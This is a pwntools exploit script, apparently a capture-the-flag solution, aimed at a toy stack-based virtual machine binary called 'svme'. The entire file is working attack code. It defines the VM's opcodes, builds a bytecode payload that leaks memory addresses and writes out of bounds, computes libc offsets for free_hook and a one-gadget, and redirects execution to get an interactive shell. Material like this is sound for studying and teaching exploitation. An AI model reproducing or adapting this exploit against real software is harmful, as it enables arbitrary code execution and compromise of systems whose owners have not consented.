#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template svme
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('simple-virtual-machine-C-master/simple_virtual_machine_C')
context.bits = 32
context.arch = "i386"

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
add-symbol-file simple-virtual-machine-C-master/src/vm.o
add-symbol-file simple-virtual-machine-C-master/src/vmtest.o
b vm_exec
brva 0x19dc
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

mul = lambda _, n: fit([_]*n)

NOOP    = 0
IADD    = 1   # int add
ISUB    = 2
IMUL    = 3
ILT     = 4   # int less than
IEQ     = 5   # int equal
BR      = 6   # branch
BRT     = 7   # branch if true
BRF     = 8   # branch if true
ICONST  = 9   # push constant integer
LOAD    = 10  # load from local context
GLOAD   = 11  # load from global memory
STORE   = 12  # store in local context
GSTORE  = 13  # store in global memory
PRINT   = 14  # print stack top
POP     = 15  # throw away top of stack
CALL    = 16  # call function at address with nargsnlocals
RET     = 17  # return value from function
HALT    = 18

io = start()

# pwndbg> print *(VM*)(0x55af2b5046cc-0x1c) # stack address - 0x1c ()
# $7 = {
  # code = 0x7fff4daab1d0,
  # code_size = 2,
  # globals = 0x55af2b5067b0,
  # nglobals = 0,
  # stack = {-559038737, 0 <repeats 999 times>},
  # call_stack = {{
      # returnip = 0,
      # locals = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0}
    # } <repeats 100 times>}
# }

leak_offset         = 0x20b3
ret_addr_offset     = 0x218
free_hook_offset    = 0x1c9b28
one_gadgets = [
    0xe6c7e,
    0xe6c81,
    0xe6c84
]
one_gadget = one_gadgets[1]

payload = fit([
    POP,
    STORE, 3,
    STORE, 2,
    mul(PRINT, 2),
    STORE, 1,
    STORE, 0,
    LOAD, 0,
    LOAD, 1,
    ICONST, 0xdeadbeef,
    ICONST, 0,
    ICONST, ret_addr_offset,
    LOAD, 0,
    IADD,
    LOAD, 1,
    ICONST, (free_hook_offset - leak_offset),
    GLOAD, 0,
    IADD,
    GLOAD, 1,
    STORE, 1,
    STORE, 0,
    mul(POP, 2),
    LOAD, 0,
    LOAD, 1,
    ICONST, (one_gadget - free_hook_offset - 0x25000),
    LOAD, 0,
    IADD,
    LOAD, 1,
    GSTORE, 1,
    GSTORE, 0,
    LOAD, 2,
    LOAD, 3,
    HALT
]).ljust(512, p8(0))

payload_len = len(payload)//4
log.info(f"Length of payload: {payload_len} <= 128 (?)")
payload = payload.replace(p32(0xdeadbeef), p32(payload_len))

log.info("Sending payload...")
io.sendline(payload)

result = io.recvuntil(b"Data memory:\n")

io.interactive()

